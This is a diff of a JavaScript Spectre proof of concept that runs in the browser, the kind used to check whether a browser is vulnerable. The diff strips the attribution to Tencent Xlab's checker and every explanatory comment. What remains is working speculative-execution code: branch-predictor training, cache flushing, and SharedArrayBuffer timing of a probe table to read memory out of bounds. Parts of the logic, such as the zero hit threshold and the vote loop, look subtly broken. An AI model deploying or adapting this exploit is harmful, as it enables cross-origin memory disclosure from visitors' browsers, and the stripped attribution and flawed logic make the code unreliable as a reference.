@@ -1,6 +1,3 @@
-// kudos to: http://xlab.tencent.com/special/spectre/spectre_check.html
-// simplified less reliable version
-
 function log(msg) {
     var p = document.getElementById("progress");
     if (p) {
@@ -22,11 +19,10 @@ function asmModule(stdlib, forgein, heap) {
     function init() {
         var i = 0;
         var j = 0;
-        // set different "size" values at 4KB offsets each (need to be uncached)
-        for (i = 0; (i | 0) < 33; i = (i + 1) | 0) // 30 max number of repetitions per try?
+        for (i = 0; (i | 0) < 33; i = (i + 1) | 0)
         {
             j = (((i << 12) | 0) + sizeArrayStart) | 0;
-            simpleByteArray[(j | 0)] = 16; // simpleByteArrayLength
+            simpleByteArray[(j | 0)] = 16;
         }
     }
 
@@ -36,7 +32,6 @@ function asmModule(stdlib, forgein, heap) {
         var arr_size = 0;
         var j = 0;
         junk = probeTable[0] | 0;
-        // "size" value repeated at different offsets to avoid having to flush it?
         j = (((sIndex << 12) | 0) + sizeArrayStart) | 0;
         arr_size = simpleByteArray[j | 0] | 0;
         if ((index | 0) < (arr_size | 0)) {
@@ -61,8 +56,6 @@ function check(data_array) {
         }
     }
 
-    // start thread counter
-    //    const worker = new Worker('timer.js');
     const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_function.toString() + ")()"], { type: 'text/javascript' })));
     const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
     const sharedArray = new Uint32Array(sharedBuffer);
@@ -73,12 +66,11 @@ function check(data_array) {
     const CACHE_HIT_THRESHOLD = 0
     var probeTable = new Uint8Array(TABLE1_BYTES);
 
-    // eviction buffer (fill LLC)
     var cache_size = CACHE_SIZE * 1024 * 1024;
     var evictionBuffer = new ArrayBuffer(cache_size);
     var evictionView = new DataView(evictionBuffer);
 
-    clflush(cache_size); // because of lazy compilation?
+    clflush(cache_size);
 
     var asm = asmModule(this, {}, probeTable.buffer)
 
@@ -89,55 +81,47 @@ function check(data_array) {
             var tries = 0
             var junk = 0;
             for (tries = 0; tries < 99; tries++) {
-                var training_x = tries % simpleByteArrayLength; // whatever
+                var training_x = tries % simpleByteArrayLength; 
                 clflush(cache_size);
-                // compile and cache functions?
                 var time3 = start();
                 junk = simpleByteArray[0];
                 var time4 = now();
                 junk ^= time4 - time3;
 
-                // train branch predictor? (every 4 good indexes uses one malicious, repeat 8 times)
                 for (var j = 1; j < 33; j++) {
-                    for (var z = 0; z < 100; z++) { } // delay
-                    // if (j % 4) training_x else malicious_x
+                    for (var z = 0; z < 100; z++) { }
                     var x = ((j % 4) - 1) & ~0xFFFF;
                     x = (x | (x >> 16));
                     x = training_x ^ (x & (malicious_x ^ training_x));
-                    asm.vul_call(x, j); // x = index to read, j = iteration for fresh size value
+                    asm.vul_call(x, j);
                 }
 
-                // measure time of all possible offsets
                 for (var i = 0; i < 256; i++) {
                     var timeS = start();
                     junk = probeTable[(i << 12)];
                     timeE = now();
-                    // if fast offset `i` was accessed
                     if (timeE - timeS <= CACHE_HIT_THRESHOLD) {
                         results[i]++;
                     }
                 }
             }
 
-            // select majority vote
             var max = -1;
             for (var i = 0; i < 256; i++) {
                 max = (max > results[i]) ? max : i;
             }
 
-            results[256] ^= junk; // reuse to avoid optimization?
+            results[256] ^= junk;
             return max;
         }
 
         asm.init();
 
-        // set data to read "out-of-bounds"
         const BOUNDARY = 0x2200000;
         var simpleByteArray = new Uint8Array(probeTable.buffer);
         for (var i = 0; i < data_array.length; i++) {
             simpleByteArray[BOUNDARY + i] = data_array[i];
         }
-        // leak data
         log("start");
         for (var i = 0; i < data_array.length; i++) {
             var data = readMemoryByte(BOUNDARY + i);
